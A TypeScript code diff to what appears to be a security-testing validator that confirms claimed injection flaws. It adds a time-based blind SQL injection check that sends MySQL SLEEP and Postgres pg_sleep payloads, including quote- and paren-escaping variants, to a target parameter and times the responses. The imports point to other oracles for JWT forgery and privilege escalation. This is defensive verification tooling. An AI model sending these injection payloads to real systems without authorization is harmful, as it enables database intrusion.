@@ -29,6 +29,7 @@ import { forgeNoneToken, jwtNoneOracle, forgeNoneVariants, forgeHs256, jwkToPems
 import { ownerFieldValues, tokenIdentity } from "./markers.js";
 import { crossWriteOracle } from "./xwrite.js";
 import { userEnumOracle } from "./userenum.js";
+import { timingOracle } from "./timing.js";
 import { privEscOracle } from "./privesc.js";
 import { bflaOracle } from "./bfla.js";
 import { massAssignOracle, buildBody, fieldRaw, fieldValue, createdId, createAssignOracle } from "./massassign.js";
@@ -773,7 +774,7 @@ const exploreInjectionValidator: Validator = {
   class: "explore.injection",
   name: "injection (generic oracle: differential, reflection, computation)",
   async validate(claim, env) {
-    const d = claim.detail as { url?: unknown; param?: unknown; where?: unknown; method?: unknown; value?: unknown; as?: unknown; gql?: unknown; bodyTemplate?: unknown; body?: unknown };
+    const d = claim.detail as { url?: unknown; param?: unknown; where?: unknown; method?: unknown; value?: unknown; as?: unknown; gql?: unknown; bodyTemplate?: unknown; body?: unknown; timing?: unknown };
     const no = (reason: string, ev?: Evidence): ClaimVerdict => ({ claimId: claim.id, state: "unproven", validator: this.name, reason, evidence: ev });
     const gql = typeof d.gql === "string" && d.gql.includes("__INJECT__") ? d.gql : null;
     const hasParam = typeof d.param === "string" && d.param.length > 0;
@@ -911,6 +912,29 @@ const exploreInjectionValidator: Validator = {
           if (r.verdict === "proven") return { claimId: claim.id, state: "proven", validator: this.name, reason: `NoSQL injection in ${pname} at ${pathOnly(url0)} (JSON operators {$ne} vs {$in: []}): ${r.reason}`, evidence: ev(r.reason), ceiling: "high" };
           if (r.verdict === "lead") leads.push(`nosql json: ${r.reason}`);
         } catch (e) { leads.push(`nosql json probe failed: ${(e as Error).message}`); }
+      }
+    }
+    // 6. Time-based blind SQLi (opt-in: detail.timing true). A matched fast/slow pair
+    // at the same point; the oracle needs clean separation, so a slow endpoint cannot
+    // fool it. Only when the model asks, since it adds seconds of latency per context.
+    if (d.timing === true && hasParam) {
+      const sleepMs = 1500, samples = 3;
+      // Fast uses sleep(0), slow uses sleep(1.5s); same shape, so latency cancels.
+      const forms: Array<{ fast: string; slow: string }> = [
+        { fast: `${baseVal}' AND SLEEP(0)-- `, slow: `${baseVal}' AND SLEEP(1.5)-- ` },        // MySQL, string
+        { fast: `${baseVal} AND pg_sleep(0)`, slow: `${baseVal} AND pg_sleep(1.5)` },             // Postgres, numeric
+        { fast: `${baseVal}') AND SLEEP(0)-- `, slow: `${baseVal}') AND SLEEP(1.5)-- ` },        // MySQL, one paren
+      ];
+      const timeIt = async (value: string): Promise<number> => { const t = Date.now(); try { await fetchWith(value); } catch { /* a timeout still counts as elapsed */ } return Date.now() - t; };
+      for (const f of forms) {
+        try {
+          const fast: number[] = [], slow: number[] = [];
+          // Interleave fast/slow so a drift in load hits both equally.
+          for (let i = 0; i < samples; i++) { fast.push(await timeIt(f.fast)); slow.push(await timeIt(f.slow)); }
+          const r = timingOracle({ fast, slow, sleepMs });
+          if (r.verdict === "proven") return { claimId: claim.id, state: "proven", validator: this.name, reason: `Time-based blind SQL injection in ${pname} at ${pathOnly(url0)}: ${r.reason}`, evidence: ev(r.reason), ceiling: "high" };
+          if (r.verdict === "lead") leads.push(`timing: ${r.reason}`);
+        } catch (e) { leads.push(`timing probe failed: ${(e as Error).message}`); }
       }
     }
     return no(leads.length ? `not proven; leads: ${leads.slice(0, 3).join("; ")}` : "no injection proven (no differential, reflection or computation)", ev(leads.slice(0, 2).join(" | ")));
